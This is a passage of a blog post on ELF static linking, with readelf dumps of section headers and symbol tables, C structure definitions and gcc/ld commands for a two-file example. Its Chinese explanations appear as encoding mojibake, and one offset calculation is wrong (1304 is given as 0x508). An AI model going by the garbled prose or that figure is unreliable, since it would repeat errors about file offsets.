Header:</span><br><span class="line">  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00</span><br><span class="line">  Class:                             ELF32</span><br><span class="line">  Data:                              2&#x27;s complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              REL (Relocatable file)</span><br><span class="line">  Machine:                           Intel 80386</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x0</span><br><span class="line">  Start of program headers:          0 (bytes into file)</span><br><span class="line">  Start of section headers:          868 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               52 (bytes)</span><br><span class="line">  Size of program headers:           0 (bytes)</span><br><span class="line">  Number of program headers:         0</span><br><span class="line">  Size of section headers:           40 (bytes)</span><br><span class="line">  Number of section headers:         13</span><br><span class="line">  Section header string table index: 10</span><br></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹å„ä¸ªsection</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">There are 13 section headers, starting at offset 0x364:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .text             PROGBITS        00000000 000034 000062 00  AX  0   0  1</span><br><span class="line">  [ 2] .rel.text         REL             00000000 0002cc 000028 08   I 11   1  4</span><br><span class="line">  [ 3] .data             PROGBITS        00000000 000098 000008 00  WA  0   0  4</span><br><span class="line">  [ 4] .bss              NOBITS          00000000 0000a0 000008 00  WA  0   0  4</span><br><span class="line">  [ 5] .rodata           PROGBITS        00000000 0000a0 000004 00   A  0   0  1</span><br><span class="line">  [ 6] .comment          PROGBITS        00000000 0000a4 000036 01  MS  0   0  1</span><br><span class="line">  [ 7] .note.GNU-stack   PROGBITS        00000000 0000da 000000 00      0   0  1</span><br><span class="line">  [ 8] .eh_frame         PROGBITS        00000000 0000dc 000064 00   A  0   0  4</span><br><span class="line">  [ 9] .rel.eh_frame     REL             00000000 0002f4 000010 08   I 11   8  4</span><br><span class="line">  [10] .shstrtab         STRTAB          00000000 000304 00005f 00      0   0  1</span><br><span class="line">  [11] .symtab           SYMTAB          00000000 000140 000110 10     12  12  4</span><br><span class="line">  [12] .strtab           STRTAB          00000000 000250 000079 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure><p>section head tableå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªElf32_Shdrç»“æ„ä½“çš„æ•°ç»„ Elf32_Shdrç»“æ„æ¥æè¿°å…·ä½“çš„sectionå±æ€§</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word  sh_name;        <span class="comment">// èŠ‚åç§°åœ¨ .shstrtab èŠ‚ä¸­çš„ç´¢å¼•</span></span><br><span class="line">    Elf32_Word  sh_type;        <span class="comment">// èŠ‚ç±»å‹</span></span><br><span class="line">    Elf32_Word  sh_flags;       <span class="comment">// èŠ‚æ ‡å¿—</span></span><br><span class="line">    Elf32_Addr  sh_addr;        <span class="comment">// èŠ‚çš„å†…å­˜åœ°å€</span></span><br><span class="line">    Elf32_Off   sh_offset;      <span class="comment">// èŠ‚åœ¨æ–‡ä»¶ä¸­çš„åç§»é‡</span></span><br><span class="line">    Elf32_Word  sh_size;        <span class="comment">// èŠ‚çš„å¤§å°ï¼ˆå­—èŠ‚æ•°ï¼‰</span></span><br><span class="line">    Elf32_Word  sh_link;        <span class="comment">// é“¾æ¥åˆ°çš„å…¶ä»–èŠ‚çš„ç´¢å¼•</span></span><br><span class="line">    Elf32_Word  sh_info;        <span class="comment">// é¢å¤–ä¿¡æ¯</span></span><br><span class="line">    Elf32_Word  sh_addralign;   <span class="comment">// å¯¹é½æ–¹å¼</span></span><br><span class="line">    Elf32_Word  sh_entsize;     <span class="comment">// èŠ‚åŒ…å«å®ä½“çš„å¤§å°</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><p><strong>sh_name</strong></p><p>èŠ‚åç§°åœ¨ .shstrtab èŠ‚ä¸­çš„ç´¢å¼•ï¼Œ .shstrtabæ˜¯èŠ‚å¤´è¡¨å­—ç¬¦ä¸²è¡¨ç´¢å¼•</p><p>å…·ä½“æ¥çœ‹ä¸‹æˆ‘ä»¬ä¾‹å­çš„ .shstrtabæ˜¯çš„nameæ˜¯æ€ä¹ˆè§£æçš„ï¼Œlinkeré¦–å…ˆä»elf headeré‡Œå¾—åˆ°.shstrtabåœ¨section head tableçš„ç¬¬åä¸ªsection e_shoff+e_shstrndx*e_shentsize&#x3D;904+10*40&#x3D;1304&#x3D;0x508,æ‰¾åˆ°è¿™ä¸ªsectionçš„æè¿°ç»“æ„ä½“</p><p><img src="/2023/04/28/static-link/image-20230428232104339.png" alt="image-20230428232104339"></p><p>å‰å››ä¸ªå­—èŠ‚å°±æ˜¯sh_nameåœ¨.shstrtab èŠ‚ä¸­çš„ç´¢å¼•ï¼Œæ‰¾åˆ°sh_offsetä¸º0x0328ï¼Œå³ä¸ºshstrtab èŠ‚åœ¨æ–‡ä»¶ä¸­çš„ä½ç½®ï¼ŒåŠ ä¸Šsh_nameè¿™ä¸ªç´¢å¼•0x0328+0x11&#x3D;0x339</p><p><img src="/2023/04/28/static-link/image-20230428232706551.png" alt="image-20230428232706551"></p><p>å°±å¯ä»¥æ‰¾åˆ°è¿™ä¸ªåå­—</p><p>ä¹‹æ‰€ä»¥è¦è¿™æ ·è¿™æ ·å­˜å‚¨åå­—ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬çš„ELFå¿…é¡»è¦æœ‰ä¸€ä¸ªå¯¹æ‰€æœ‰æ–‡ä»¶å›ºå®šçš„æ ¼å¼ï¼Œä½†æ˜¯åå­—å¾€å¾€æ˜¯ä¸å›ºå®šçš„é•¿åº¦ï¼Œå¦‚æœç›´æ¥å­˜å‚¨è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå°±ä¸èƒ½ç”¨ä¸€ä¸ªç»Ÿä¸€çš„ç»“æ„ä½“å»æè¿°ï¼Œå­˜å‚¨ç´¢å¼•å®Œç¾è§£å†³</p><p><strong>sh_type</strong></p><p>å†³å®šäº†èŠ‚çš„ç±»å‹ SHT_SYMTABï¼ŒSHT_RELAï¼ŒSHT_DYNAMICï¼ŒSHT_RELç­‰</p><p><strong>sh_flags</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SHF_WRITE     This section  contains  data  that  should  be writable during process execution.</span><br><span class="line"></span><br><span class="line">SHF_ALLOC      This  section  occupies  memory during process execution. Some  control  sections  <span class="keyword">do</span> notreside  in the memory image of an object file. This attribute is off <span class="keyword">for</span> those sections.è¡¨ç¤ºè¯¥èŠ‚åœ¨è¿›ç¨‹ç©ºé—´é‡Œè¦åˆ†é…å†…å­˜ï¼Œæœ‰äº›èŠ‚æ˜¯ä¸€äº›æ§åˆ¶ä¿¡æ¯ä¸ä¼šè¢«åŠ è½½åˆ°è¿›ç¨‹ç©ºé—´ï¼Œä¸€èˆ¬ä»£ç æ®µæ•°æ®æ®µï¼Œå’Œ.bssæ®µéƒ½ä¼šæœ‰è¿™ä¸ªè¡¨ç¤ºï¼Œå¦å¤–ä¸€äº›èŠ‚å®Œæˆä»»åŠ¡ä¹‹åå°±æ‰”äº†å°¼ï¼Œå˜¿å˜¿</span><br><span class="line"></span><br><span class="line">SHF_EXECINSTR  This  section  contains   executable   machineinstructions.</span><br><span class="line"></span><br><span class="line">SHF_MASKPROC   All  bits  included  in this mask are reserved <span class="keyword">for</span> processor-specific semantics.</span><br></pre></td></tr></table></figure><p><strong>sh_link</strong>å’Œ<strong>sh_info</strong>åªæœ‰èŠ‚çš„ç±»å‹æ˜¯ä¸é“¾æ¥ç›¸å…³æ—¶æ‰ä¼šæœ‰ç”¨</p><p><img src="/2023/04/28/static-link/image-20230429003128446.png" alt="image-20230429003128446"></p><p><strong>sh_entsize</strong></p><p>æœ‰ä¸€äº›èŠ‚çš„å†…å®¹æ˜¯ä¸€å¼ è¡¨ï¼Œå…¶ä¸­æ¯ä¸€ä¸ªè¡¨é¡¹çš„å¤§å°æ˜¯å›ºå®šçš„ï¼Œæ¯”å¦‚ç¬¦å·è¡¨ã€‚ å¯¹äºè¿™ç§è¡¨æ¥è¯´ï¼Œæœ¬æˆå‘˜æŒ‡å®šå…¶æ¯ä¸€ä¸ªè¡¨é¡¹çš„å¤§å°ã€‚</p><h3 id="static-link"><a href="#static-link" class="headerlink" title="static link"></a>static link</h3><p><strong>a.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> shared;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">6</span>;</span><br><span class="line">    swap(&amp;a, &amp;shared);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>b.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> shared = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span>* b)</span> &#123;</span><br><span class="line">    *a ^= *b ^= *a ^= *b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; gcc -m32 -fno-<span class="built_in">stack</span>-protector -c a.c b.c</span><br><span class="line">a.c: In function â€˜mainâ€™:</span><br><span class="line">a.c:<span class="number">6</span>:<span class="number">5</span>: warning: implicit declaration of function â€˜swapâ€™ [-Wimplicit-function-declaration]</span><br><span class="line">     swap(&amp;a, &amp;shared);</span><br><span class="line">     ^</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; ld -m elf_i386 a.o b.o -e main -o  ab</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; file a.o b.o ab</span><br><span class="line">a.o: ELF <span class="number">32</span>-bit LSB relocatable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), not stripped</span><br><span class="line">b.o: ELF <span class="number">32</span>-bit LSB relocatable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), not stripped</span><br><span class="line">ab:  ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), statically linked, not stripped</span><br></pre></td></tr></table></figure><p>æŠŠcanaryå…³äº†ï¼Œä¸ç„¶é“¾æ¥æ˜¯æ‰¾ä¸åˆ°__stack_chk_failï¼Œå› ä¸ºæˆ‘ä»¬å¹¶æ²¡æœ‰ldæ ‡å‡†é“¾æ¥åº“ï¼Œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; gcc -m32  -c a.c b.c</span><br><span class="line">a.c: In function â€˜mainâ€™:</span><br><span class="line">a.c:6:5: warning: implicit declaration of function â€˜swapâ€™ [-Wimplicit-function-declaration]</span><br><span class="line">     swap(&amp;a, &amp;shared);</span><br><span class="line">     ^</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; checksec a.o</span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/link-load-library-code/chapter4/a.o&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; gcc -m32 -fno-stack-protector -c a.c b.c</span><br><span class="line">a.c: In function â€˜mainâ€™:</span><br><span class="line">a.c:6:5: warning: implicit declaration of function â€˜swapâ€™ [-Wimplicit-function-declaration]</span><br><span class="line">     swap(&amp;a, &amp;shared);</span><br><span class="line">     ^</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; checksec a.o</span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/link-load-library-code/chapter4/a.o&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><p>ldæ—¶-eæŒ‡å®šä¸‹å…¥å£ä¸ºmianï¼Œä¸ç„¶ldæ—¶æ‰¾ä¸åˆ°é»˜è®¤çš„_start</p><p>gcc11.3è¿˜éœ€è¦-fno-pieæŠŠpieå…³äº†,ä¸ç„¶ä»–çš„é‡å®šä½ç±»å‹ä¼¼ä¹æ˜¯æŒ‰ç…§å…±äº«åº“æ¥çš„ï¼Œæˆ‘ä»¬å…ˆæé™æ€ï¼Œgcc5åŠ ä¸åŠ éƒ½è¡Œ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; readelf -S a.o</span><br><span class="line">There are <span class="number">12</span> section headers, starting at offset <span class="number">0x220</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>            <span class="number">00000000</span> <span class="number">000000</span> <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .text             PROGBITS        <span class="number">00000000</span> <span class="number">000034</span> <span class="number">000039</span> <span class="number">00</span>  AX  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">2</span>] .rel.text         REL             <span class="number">00000000</span> <span class="number">0001b</span>0 <span class="number">000010</span> <span class="number">08</span>   I <span class="number">10</span>   <span class="number">1</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">3</span>] .data             PROGBITS        <span class="number">00000000</span> <span class="number">00006</span>d <span class="number">000000</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">4</span>] .bss              NOBITS          <span class="number">00000000</span> <span class="number">00006</span>d <span class="number">000000</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">5</span>] .comment          PROGBITS        <span class="number">00000000</span> <span class="number">00006</span>d <span class="number">000036</span> <span class="number">01</span>  MS  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">6</span>] .note.GNU-<span class="built_in">stack</span>   PROGBITS        <span class="number">00000000</span> <span class="number">0000</span>a3 <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">7</span>] .eh_frame         PROGBITS        <span class="number">00000000</span> <span class="number">0000</span>a4 <span class="number">000044</span> <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">8</span>] .rel.eh_frame     REL             <span class="number">00000000</span> <span class="number">0001</span>c0 <span class="number">000008</span> <span class="number">08</span>   I <span class="number">10</span>   <span class="number">7</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">9</span>] .shstrtab         STRTAB          <span class="number">00000000</span> <span class="number">0001</span>c8 <span class="number">000057</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [<span class="number">10</span>] .symtab           SYMTAB          <span class="number">00000000</span> <span class="number">0000e8</span> <span class="number">0000b</span>0 <span class="number">10</span>     <span class="number">11</span>   <span class="number">8</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">11</span>] .strtab           STRTAB          <span class="number">00000000</span> <span class="number">000198</span> <span class="number">000016</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; readelf -S b.o</span><br><span class="line">There are <span class="number">11</span> section headers, starting at offset <span class="number">0x1f4</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>            <span class="number">00000000</span> <span class="number">000000</span> <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .text             PROGBITS        <span class="number">00000000</span> <span class="number">000034</span> <span class="number">000039</span> <span class="number">00</span>  AX  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">2</span>] .data             PROGBITS        <span class="number">00000000</span> <span class="number">000070</span> <span class="number">000004</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">3</span>] .bss              NOBITS          <span class="number">00000000</span> <span class="number">000074</span> <span class="number">000000</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">4</span>] .comment          PROGBITS        <span class="number">00000000</span> <span class="number">000074</span> <span class="number">000036</span> <span class="number">01</span>  MS  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">5</span>] .note.GNU-<span class="built_in">stack</span>   PROGBITS        <span class="number">00000000</span> <span class="number">0000</span>aa <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">6</span>] .eh_frame         PROGBITS        <span class="number">00000000</span> <span class="number">0000</span>ac <span class="number">000038</span> <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">7</span>] .rel.eh_frame     REL             <span class="number">00000000</span> <span class="number">000198</span> <span class="number">000008</span> <span class="number">08</span>   I  <span class="number">9</span>   <span class="number">6</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">8</span>] .shstrtab         STRTAB          <span class="number">00000000</span> <span class="number">0001</span>a0 <span class="number">000053</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">9</span>] .symtab           SYMTAB          <span class="number">00000000</span> <span class="number">0000e4</span> <span class="number">0000</span>a0 <span class="number">10</span>     <span class="number">10</span>   <span class="number">8</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">10</span>] .strtab           STRTAB          <span class="number">00000000</span> <span class="number">000184</span> <span class="number">000011</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; readelf -S ab</span><br><span class="line">There are <span class="number">8</span> section headers, starting at offset <span class="number">0x2e4</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>            <span class="number">00000000</span> <span class="number">000000</span> <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .text             PROGBITS        <span class="number">08048094</span> <span class="number">000094</span> <span class="number">000072</span> <span class="number">00</span>  AX  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">2</span>] .eh_frame         PROGBITS        <span class="number">08048108</span> <span class="number">000108</span> <span class="number">000064</span> <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">3</span>] .data             PROGBITS        <span class="number">0804916</span>c <span class="number">00016</span>c <span class="number">000004</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">4</span>] .comment          PROGBITS        <span class="number">00000000</span> <span class="number">000170</span> <span class="number">000035</span> <span class="number">01</span>  MS  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">5</span>] .shstrtab         STRTAB          <span class="number">00000000</span> <span class="number">0002</span>aa <span class="number">00003</span>a <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">6</span>] .symtab           SYMTAB          <span class="number">00000000</span> <span class="number">0001</span>a8 <span class="number">0000</span>d0 <span class="number">10</span>      <span class="number">7</span>   <span class="number">7</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">7</span>] .strtab           STRTAB          <span class="number">00000000</span> <span class="number">000278</span> <span class="number">000032</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure><h4 id="ç©ºé—´ä¸åœ°å€åˆ†é…"><a href="#ç©ºé—´ä¸åœ°å€åˆ†é…" class="headerlink" title="ç©ºé—´ä¸åœ°å€åˆ†é…"></a>ç©ºé—´ä¸åœ°å€åˆ†é…</h4><p>linkeræŠŠæ‰€æœ‰çš„è¾“å…¥ç›®æ ‡æ–‡ä»¶ç›¸åŒçš„èŠ‚åˆå¹¶æˆä¸€ä¸ªï¼Œä»å¤§å°ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥æ˜¯åˆå¹¶äº†ï¼Œç„¶åé‡æ–°ç”Ÿæˆä¸€ä¸ªelf headeræ¥å¸®åŠ©æˆ‘ä»¬åŠ è½½æ—¶æ‰¾åˆ°æ–°æ®µ</p><h4 id="ç¬¦å·è§£æä¸é‡å®šä½"><a href="#ç¬¦å·è§£æä¸é‡å®šä½" class="headerlink" title="ç¬¦å·è§£æä¸é‡å®šä½"></a>ç¬¦å·è§£æä¸é‡å®šä½</h4><p>é“¾æ¥çš„æœ¬è´¨å°±æ˜¯æŠŠä¸åŒç›®æ ‡æ–‡ä»¶ç²˜åœ¨ä¸€èµ·ï¼Œç¬¦å·æ˜¯ç²˜åˆå‰‚ï¼Œç¬¦å·åŒ…æ‹¬å˜é‡åï¼Œå‡½æ•°åï¼Œè¿˜æœ‰æ®µåç­‰ç­‰ï¼Œç¬¦å·æ ‡è®°äº†å„ç§ä¿¡æ¯ï¼Œä»–è¢«å­˜å‚¨åœ¨æˆ‘ä»¬çš„.symtab sectionæ ‡å¿—çš„ç¬¦å·è¡¨é‡Œ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Word    st_name;<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">    Elf32_Addr    st_value;<span class="comment">/* Symbol value */</span></span><br><span class="line">    Elf32_Word    st_size;<span class="comment">/* Symbol size */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>    st_info;<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>    st_other;<span class="comment">/* Symbol visibility */</span></span><br><span class="line">    Elf32_Section    st_shndx;<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><p><strong>st_name</strong></p><p>åœ¨.strtab å­—ç¬¦ä¸²è¡¨é‡Œçš„ä¸‹æ ‡</p><p><strong>st_shndx</strong></p><ul><li>ç¬¦å·å®šä¹‰åœ¨æœ¬æ–‡ä»¶<ul><li>ç¬¦å·æ‰€åœ¨æ®µä¸‹æ ‡</li></ul></li><li>ä¸åœ¨æœ¬æ–‡æ–‡ä»¶æˆ–è€…æŸäº›ç‰¹æ®Šå€¼<ul><li>SHN_ABS è¡¨ç¤ºè¯¥ç¬¦å·åŒ…å«ä¸€ä¸ªç»å¯¹çš„å€¼</li><li>SHN_COMMON è¡¨ç¤ºè¯¥ç¬¦å·æ˜¯ä¸€ä¸ªCOMMONå—ç±»å‹çš„ç¬¦å·</li><li>SHN_UNDEF è¡¨ç¤ºè¯¥ç¬¦å·æœªå®šä¹‰</li></ul></li></ul><p><strong>st_info</strong></p><p>ç¬¦å·çš„ç±»å‹å’Œç»‘å®šä¿¡æ¯</p><p>ç»‘å®šä¿¡æ¯</p><ul><li>STB_LOCALå±€éƒ¨ç¬¦å·</li><li>STB_GLOBALå…¨å±€ç¬¦å·</li><li>STB_WEAKå¼±ç¬¦å·</li></ul><p>ç¬¦å·ç±»å‹</p><ul><li>STT_NOTYPE æœªçŸ¥</li><li>STT_OBJECT æ•°æ®å¯¹è±¡ï¼Œæ¯”å¦‚å˜é‡</li><li>STT_FUNC å‡½æ•°æˆ–å¯æ‰§è¡Œä»£ç  </li><li>STT_SECTION è¡¨ç¤ºä¸€ä¸ªæ®µ</li><li>STT_FILEè¡¨ç¤ºæ–‡ä»¶å st_shndxä¸€å®šæ˜¯SHN_ABS</li></ul><p><strong>st_size</strong></p><p>ç¬¦å·å¤§å°ï¼Œå¯¹äºåŒ…å«æ•°æ®çš„ç¬¦å·ï¼Œè¿™ä¸ªå€¼æ˜¯æ•°æ®ç±»å‹çš„å¤§å°ï¼Œæ¯”å¦‚æˆ‘ä»¬ä¸Šé¢a.oçš„mainå°±æ˜¯mainå‡½æ•°çš„å¤§å°ï¼Œ0x39&#x3D;57,int ç±»å‹çš„sharedå¤§å°ä¸º4</p><p><strong>st_value</strong></p><ul><li>åœ¨å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶é‡Œå‡½æ•°æˆ–å˜é‡ç¬¦å·<ul><li>ç¬¦å·ç±»å‹ä¸åœ¨commonå—é‡Œï¼Œåˆ™è¡¨ç¤ºç¬¦å·åœ¨æ®µé‡Œçš„åç§»</li><li>åœ¨commonå—é‡Œï¼Œåˆ™è¡¨ç¤ºç¬¦å·å¯¹é½å±æ€§</li></ul></li><li>å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶é‡Œ<ul><li>è¡¨ç¤ºç¬¦å·çš„è™šæ‹Ÿåœ°å€</li></ul></li></ul><p><strong>st_other</strong>æš‚æ—¶æ²¡ç”¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; readelf -s a.o b.o ab</span><br><span class="line"></span><br><span class="line">File: a.o</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.symtab&#x27; contains 11 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 00000000     0 FILE    LOCAL  DEFAULT  ABS a.c</span><br><span class="line">     2: 00000000     0 SECTION LOCAL  DEFAULT    1</span><br><span class="line">     3: 00000000     0 SECTION LOCAL  DEFAULT    3</span><br><span class="line">     4: 00000000     0 SECTION LOCAL  DEFAULT    4</span><br><span class="line">     5: 00000000     0 SECTION LOCAL  DEFAULT    6</span><br><span class="line">     6: 00000000     0 SECTION LOCAL  DEFAULT    7</span><br><span class="line">     7: 00000000     0 SECTION LOCAL  DEFAULT    5</span><br><span class="line">     8: 00000000    57 FUNC    GLOBAL DEFAULT    1 main</span><br><span class="line">     9: 00000000     0 NOTYPE  GLOBAL DEFAULT  UND shared</span><br><span class="line">    10: 00000000     0 NOTYPE  GLOBAL DEFAULT  UND swap</span><br><span class="line"></span><br><span class="line">File: b.o</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.symtab&#x27; contains 10 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 00000000     0 FILE    LOCAL  DEFAULT  ABS b.c</span><br><span class="line">     2: 00000000     0 SECTION LOCAL  DEFAULT    1</span><br><span class="line">     3: 00000000     0 SECTION LOCAL  DEFAULT    2</span><br><span class="line">     4: 00000000     0 SECTION LOCAL  DEFAULT    3</span><br><span class="line">     5: 00000000     0 SECTION LOCAL  DEFAULT    5</span><br><span class="line">     6: 00000000     0 SECTION LOCAL  DEFAULT    6</span><br><span class="line">     7: 00000000     0 SECTION LOCAL  DEFAULT    4</span><br><span 